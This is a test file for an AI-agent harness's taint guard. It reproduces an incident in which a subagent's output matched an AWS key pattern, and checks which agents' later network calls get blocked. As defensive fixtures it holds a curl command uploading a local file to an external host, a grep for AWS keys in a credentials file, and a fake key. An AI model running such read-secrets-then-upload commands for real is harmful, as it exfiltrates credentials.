// End-to-end reproduction of the H3 incident shape (session c698b9a9), driven
// through the REAL evaluators (`evaluatePostToolUse` → `evaluatePreToolUse`)
// and the real SessionTracker, not the tracker in isolation.
//
// Incident: one subagent's command output matched a secret signature, the
// session field went Confidential, and every network call of 41 actors was
// blocked. With the per-actor lineage the ratcheting child and the root are
// blocked, a concurrently-running sibling is not, and a child spawned
// afterwards inherits the block.
//
// Labeled P (must block / must hold) / N (must not block).

import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { CohortManager } from "../cohort.js";
import { evaluatePostToolUse } from "../evaluator/post-tool.js";
import { evaluatePreToolUse } from "../evaluator/pre-tool.js";
import { ReservationManager } from "../reservations.js";
import { getDefaultConfig } from "../rules-loader.js";
import { SessionTracker } from "../session-state.js";
import { actorLevel } from "../taint-lineage.js";
import type { HarnessDecision, HarnessEvent, SessionTrajectory } from "../types.js";

// Built at run time so this source file carries no literal key shape.
const AWS_KEY = ["AKIA", "IOSFODNN7EXAMPLQ", "0123456789"].join("");
const SID = "c698b9a9-incident";
const ROOT = "lead";

let dir: string;
let tracker: SessionTracker;
let session: SessionTrajectory;

const RULES = getDefaultConfig();

function base(over: Partial<HarnessEvent>): HarnessEvent {
	return {
		hook_event: "PreToolUse",
		session_id: SID,
		agent_source: "claude",
		cwd: dir,
		timestamp: "2026-10-05T08:09:46.000Z",
		...over,
	};
}

function record(event: HarnessEvent): SessionTrajectory {
	return tracker.recordEvent(event);
}

/** One actor's `curl` through the real PreToolUse pipeline. */
function curl(actor: string): HarnessDecision {
	const event = base({
		hook_event: "PreToolUse",
		tool_name: "Bash",
		tool_input: { command: "curl -sS https://example.com/upload -d @payload.json" },
		...(actor === ROOT ? { agent_name: ROOT } : { agent_name: actor, subagent_id: actor }),
	});
	record(event);
	return evaluatePreToolUse(event, RULES, session, new ReservationManager(), new CohortManager());
}

/** The incident's trigger: a subagent's Bash output carries a secret shape. */
function secretOutput(actor: string): string[] {
	const event = base({
		hook_event: "PostToolUse",
		agent_name: actor,
		subagent_id: actor,
		tool_name: "Bash",
		tool_input: { command: "rg -o 'AKIA[0-9A-Z]+' creds.txt" },
		tool_response: `creds.txt:1:${AWS_KEY}\n`,
	});
	record(event);
	const res = evaluatePostToolUse(event, RULES, session, new ReservationManager(), new CohortManager());
	return res.warnings ?? [];
}

function spawn(id: string): void {
	record(base({ hook_event: "SubagentStart", agent_name: id, subagent_id: id }));
}

const isBlocked = (d: HarnessDecision) => d.decision === "block";

beforeEach(() => {
	dir = mkdtempSync(join(tmpdir(), "taint-incident-"));
	writeFileSync(join(dir, "creds.txt"), `${AWS_KEY}\n`);
	writeFileSync(join(dir, "payload.json"), "{}\n");
	tracker = new SessionTracker();
	session = record(base({ hook_event: "SessionStart", agent_name: ROOT }));
	spawn("child-a");
	spawn("child-b");
});
afterEach(() => rmSync(dir, { recursive: true, force: true }));

describe("H3 incident shape — positive (must block)", () => {
	it("P1: the ratcheting child's own curl is blocked, and so is the root's", () => {
		const warnings = secretOutput("child-a");
		expect(warnings.some((w) => w.includes("[interlinked:output-scan]"))).toBe(true);
		expect(actorLevel(session, "child-a")).toBe("Confidential");

		const childDecision = curl("child-a");
		expect(isBlocked(childDecision)).toBe(true);
		const rootDecision = curl(ROOT);
		expect(isBlocked(rootDecision)).toBe(true);
		// The sequence phase runs before the taint guard, so the reason comes
		// from `secret_read_then_network_call`; either way it names the level.
		expect(rootDecision.reason).toContain("Confidential");
	});

	it("P2: a child spawned AFTER the ratchet inherits the block", () => {
		secretOutput("child-a");
		spawn("child-c");
		expect(isBlocked(curl("child-c"))).toBe(true);
	});

	it("P3: a sibling that READS the file the tainted child wrote is blocked (B5)", () => {
		secretOutput("child-a");
		const write = base({
			hook_event: "PostToolUse",
			agent_name: "child-a",
			subagent_id: "child-a",
			tool_name: "Write",
			tool_input: { file_path: join(dir, "handoff.txt"), content: "notes" },
		});
		record(write);
		evaluatePostToolUse(write, RULES, session, new ReservationManager(), new CohortManager());
		writeFileSync(join(dir, "handoff.txt"), "notes\n");

		const read = base({
			hook_event: "PreToolUse",
			agent_name: "child-b",
			subagent_id: "child-b",
			tool_name: "Read",
			tool_input: { file_path: join(dir, "handoff.txt") },
		});
		record(read);
		evaluatePreToolUse(read, RULES, session, new ReservationManager(), new CohortManager());
		expect(actorLevel(session, "child-b")).toBe("Confidential");
		expect(isBlocked(curl("child-b"))).toBe(true);
	});
});

describe("H3 incident shape — negative (must not block)", () => {
	it("N1: the concurrently-running sibling's curl is ALLOWED — the incident's 41-actor blast radius", () => {
		secretOutput("child-a");
		const decision = curl("child-b");
		expect(decision.decision).toBe("allow");
		expect(actorLevel(session, "child-b")).toBe("Public");
	});

	it("N2: a sibling reading an UNRELATED file the tainted child never wrote stays allowed", () => {
		secretOutput("child-a");
		writeFileSync(join(dir, "unrelated.txt"), "plain\n");
		const read = base({
			hook_event: "PreToolUse",
			agent_name: "child-b",
			subagent_id: "child-b",
			tool_name: "Read",
			tool_input: { file_path: join(dir, "unrelated.txt") },
		});
		record(read);
		evaluatePreToolUse(read, RULES, session, new ReservationManager(), new CohortManager());
		expect(curl("child-b").decision).toBe("allow");
	});

	it("N3: with no subagents at all, the root's own output still blocks its own curl", () => {
		const event = base({
			hook_event: "PostToolUse",
			agent_name: ROOT,
			tool_name: "Bash",
			tool_input: { command: "rg -o 'AKIA[0-9A-Z]+' creds.txt" },
			tool_response: `creds.txt:1:${AWS_KEY}\n`,
		});
		record(event);
		evaluatePostToolUse(event, RULES, session, new ReservationManager(), new CohortManager());
		expect(isBlocked(curl(ROOT))).toBe(true);
	});
});
